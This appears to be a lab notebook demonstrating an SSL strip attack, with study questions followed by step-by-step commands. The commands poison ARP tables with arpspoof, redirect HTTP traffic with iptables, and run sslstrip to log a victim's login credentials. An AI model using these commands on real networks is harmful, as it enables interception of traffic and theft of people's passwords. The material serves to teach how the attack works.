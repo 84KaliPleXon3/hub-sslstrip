{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SSL Strip Attack\n",
    "\n",
    "## Introduction\n",
    "This demonstration illustrates a SSL strip attack, where a malicious hacker on the same network becomes a proxy between the victims and the webpages from the server they are visiting. The ``SSL strip`` technique is able to strip off the SSL configuration and convert a HTTPS based communicaton to a HTTP based one. \n",
    "\n",
    "## Steps\n",
    "\n",
    "### Before the Attack\n",
    "1. What are the IP addresses of the ``victim`` and ``server``? *(hint: ifconfig)*\n",
    "2. What is an ArpSpoof man-in-the-middle attack and how to arpspoof the ``victim`` into believing that the ``hacker`` is the ``server`` *(hint: arpsppoof, use -t option to specify a ``victim`` to ARP poison)*?\n",
    "3. How to verify if the ARP poisoning is successful? *(hint: the ARP table of the ``victim``)*\n",
    "3. How to redirect all HTTP traffic of the ``hacker`` to a port that SSLStrip will monitor？ *(hint: NAT table of iptables)*\n",
    "4. What is a SSL strip attack and how to monitor a port of the ``hacker`` using SSLStrip? *(hint: sslstrip, use -l to specify a port to monitor)*\n",
    "\n",
    "### During the Attack\n",
    "1. On the ``hacker``, start ARP poisoning in the background by typing ``sudo arpspoof -t <victim IP> <server IP> &> /dev/null &``\n",
    "2. Redirect all HTTP traffic to a port that SSLStrip will monitor by typing ``sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080``\n",
    "3. Start SSLStrip in the background by typing: ``sslstrip -l 8080 &> /dev/null &``\n",
    "4. On the ``victim``, open the webpage by typing the ip address of the ``server`` in the address bar and log in with username ``admin`` and password ``admin``. *(tip: as self-signed certificates are used, the users are required to the security expcetion prompted by the browsers)*\n",
    "5. Now go back to the ``hacker`` and print the logs of the SSLStrip by typing ``cat sslstrip.log``. *(it should be empty since HTTPS is used for communication)*\n",
    "6. On the ``victim``, open another tab of the browser to log in to the ``server`` again.\n",
    "7. Go back to the ``hacker`` again and check the SSLStrip logs ``cat sslstrip.log``. This time we should see the username and password entered by the ``victim``."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
